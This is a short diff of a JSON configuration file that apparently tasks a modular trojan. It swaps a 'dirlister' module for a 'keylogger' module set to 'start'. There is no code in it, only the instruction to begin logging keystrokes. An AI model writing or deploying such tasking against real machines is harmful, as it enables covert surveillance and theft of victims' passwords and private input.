@@ -1,5 +1,8 @@
-[
-    {
-        "module" : "dirlister"
-    }
-]
+{
+    "modules": [
+        {
+            "module": "keylogger",
+            "command": "start"
+        }
+    ]
+}
